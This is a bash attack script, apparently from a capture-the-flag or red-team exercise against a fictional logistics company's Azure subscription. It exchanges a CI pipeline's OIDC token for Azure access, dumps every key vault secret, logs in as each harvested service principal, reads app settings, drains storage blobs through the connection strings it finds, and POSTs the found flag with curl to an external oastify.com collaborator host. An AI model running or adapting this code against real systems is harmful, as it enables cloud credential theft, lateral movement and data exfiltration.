#!/usr/bin/env bash
# Tebamoto Logistics - step 5, run 9.
# Run 8: kv-tbl-sec-x3euoz is RBAC-only (0 access policies). directory-audit-principal and
# secrets-sync-principal did NOT error on `az webapp config appsettings list`, but my jq
# returned nothing - az writes warnings to stdout, so the payload was not valid JSON.
# Fix: slice from the first '[' before parsing, and print raw head on failure.
#
# Read-only, scoped to rg-tbl-platform-prod-sea. Setting VALUES are never echoed - only
# names, lengths and match/no-match. The flag goes out-of-band only.
set -uo pipefail

COLLAB="qd7hc0dfk4496dnnphwewgj2dtjo778imqpse.oastify.com"
RG="rg-tbl-platform-prod-sea"
SRC_VAULT="kv-tbl-prod-x3euoz"
TGT_VAULT="kv-tbl-sec-x3euoz"
APP="app-tbl-storefront-prod"
FLAGRE='DF26\{[^}]+\}'
FOUND=""; FOUND_AT=""
WORK=$(mktemp -d); DL=$(mktemp -d)
say() { echo "[*] $*"; }
jsonify() { sed -n '/^[[{]/,$p' <<<"$1"; }     # drop az warning preamble

drain_conn() {                 # $1=conn string (never printed) $2=label
  local CS="$1" WHO="$2" CL BL SZ MM
  CL=$(az storage container list --connection-string "$CS" --query "[].name" -o tsv 2>&1)
  grep -qiE 'error|denied|forbidden|not valid' <<<"$CL" && { say "        conn unusable"; return 0; }
  say "        containers: $(tr '\n' ' ' <<<"$CL" | head -c 110)"
  for C in $CL; do
    BL=$(az storage blob list --connection-string "$CS" -c "$C" --query "[].name" -o tsv 2>&1)
    grep -qiE 'error|denied|forbidden' <<<"$BL" && { say "          $C denied"; continue; }
    for B in $BL; do
      rm -f "$DL/b"
      az storage blob download --connection-string "$CS" -c "$C" -n "$B" --file "$DL/b" --overwrite -o none >/dev/null 2>&1
      [ -f "$DL/b" ] || continue
      SZ=$(wc -c <"$DL/b"); MM=$(grep -aoE "$FLAGRE" "$DL/b" | head -1)
      say "          $C/$B size=$SZ flag=${MM:+MATCH}${MM:--}"
      if [ -n "$MM" ] && [ -z "$FOUND" ]; then FOUND="$MM"; FOUND_AT="$C/$B via $WHO"; fi
    done
  done
}

probe() {                      # $1=label
  local WHO="$1" RAW J N CS MM RA
  RAW=$(az webapp config appsettings list -n "$APP" -g "$RG" -o json 2>&1)
  J=$(jsonify "$RAW")
  if N=$(jq -r 'length' <<<"$J" 2>/dev/null) && [ -n "$N" ] && [ "$N" != "null" ]; then
    say "    appsettings: $N entries -> $(jq -r '[.[].name]|join(",")' <<<"$J" | head -c 200)"
    MM=$(grep -aoE "$FLAGRE" <<<"$J" | head -1)
    [ -n "$MM" ] && { FOUND="$MM"; FOUND_AT="appsettings via $WHO"; return 0; }
    while IFS= read -r CS; do
      [ -z "$CS" ] && continue
      say "      connection-ish setting (len=${#CS}, not shown)"
      drain_conn "$CS" "$WHO"
      [ -n "$FOUND" ] && return 0
    done < <(jq -r '.[] | select(.value|test("AccountKey=|SharedAccessSignature=";"i")) | .value' <<<"$J" 2>/dev/null)
  else
    say "    appsettings unreadable: $(head -c 100 <<<"$RAW" | tr -d '\n')"
  fi
  RA=$(az role assignment list --all -o json 2>&1); RA=$(jsonify "$RA")
  if jq -e . >/dev/null 2>&1 <<<"$RA"; then
    say "    role assignments: $(jq -r 'length' <<<"$RA")"
    jq -r '.[] | "        \(.roleDefinitionName) @ \(.scope|split("/")|last) [\(.principalType // "?")]"' <<<"$RA" 2>/dev/null | sort -u | head -14
  else
    say "    role assignments denied"
  fi
}

federate() {
  local t; t=$(curl -sS -H "Authorization: Bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" \
      "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api%3A%2F%2FAzureADTokenExchange" | jq -r '.value // empty')
  [ -z "$t" ] && return 1
  az logout >/dev/null 2>&1
  az login --service-principal -u "$AZURE_CLIENT_ID" -t "$AZURE_TENANT_ID" \
    --federated-token "$t" --allow-no-subscriptions >/dev/null 2>&1
}

federate && say "federated OK" || exit 1
for S in $(az keyvault secret list --vault-name "$SRC_VAULT" --query "[].name" -o tsv 2>/dev/null); do
  az keyvault secret show --vault-name "$SRC_VAULT" --name "$S" --query value -o tsv >"$WORK/$S" 2>/dev/null
done

# the two that did not error on appsettings in run 8, first
for PRI in directory-audit-principal secrets-sync-principal cost-reader-principal \
           reporting-service-principal sync-service-principal; do
  [ -n "$FOUND" ] && break
  F="$WORK/$PRI"; [ -s "$F" ] || continue
  CID=$(jq -r '.appId // empty' <"$F"); SEC=$(jq -r '.clientSecret // empty' <"$F"); TEN=$(jq -r '.tenantId // empty' <"$F")
  az logout >/dev/null 2>&1
  az login --service-principal -u "$CID" -p "$SEC" -t "${TEN:-$AZURE_TENANT_ID}" --allow-no-subscriptions >/dev/null 2>&1 \
    || { say "=== $PRI login failed"; continue; }
  say "=== $PRI (${CID:0:8}…) ==="
  probe "$PRI"
  # also retry the target vault now that we know it is RBAC-only
  L=$(az keyvault secret list --vault-name "$TGT_VAULT" --query "[].name" -o tsv 2>&1)
  if ! grep -qiE 'forbidden|not authorized|error' <<<"$L"; then
    say "    $TGT_VAULT UNLOCKED: $(tr '\n' ' ' <<<"$L")"
    for T in $L; do
      V=$(az keyvault secret show --vault-name "$TGT_VAULT" --name "$T" --query value -o tsv 2>/dev/null)
      MM=$(grep -aoE "$FLAGRE" <<<"$V" | head -1)
      say "      secret=$T len=${#V} flag=${MM:+MATCH}${MM:--}"
      [ -n "$MM" ] && [ -z "$FOUND" ] && { FOUND="$MM"; FOUND_AT="$TGT_VAULT/$T via $PRI"; }
    done
  fi
done

rm -rf "$WORK" "$DL"
if [ -n "$FOUND" ]; then
  say "FLAG FOUND at $FOUND_AT - OOB only"
  curl -sS -m 25 -X POST --data-binary "$FOUND" -H 'Content-Type: text/plain' \
    "http://${COLLAB}/flag" -o /dev/null -w '    exfil http=%{http_code}\n' 2>&1
else
  say "no match"
fi
az logout >/dev/null 2>&1; say "done"
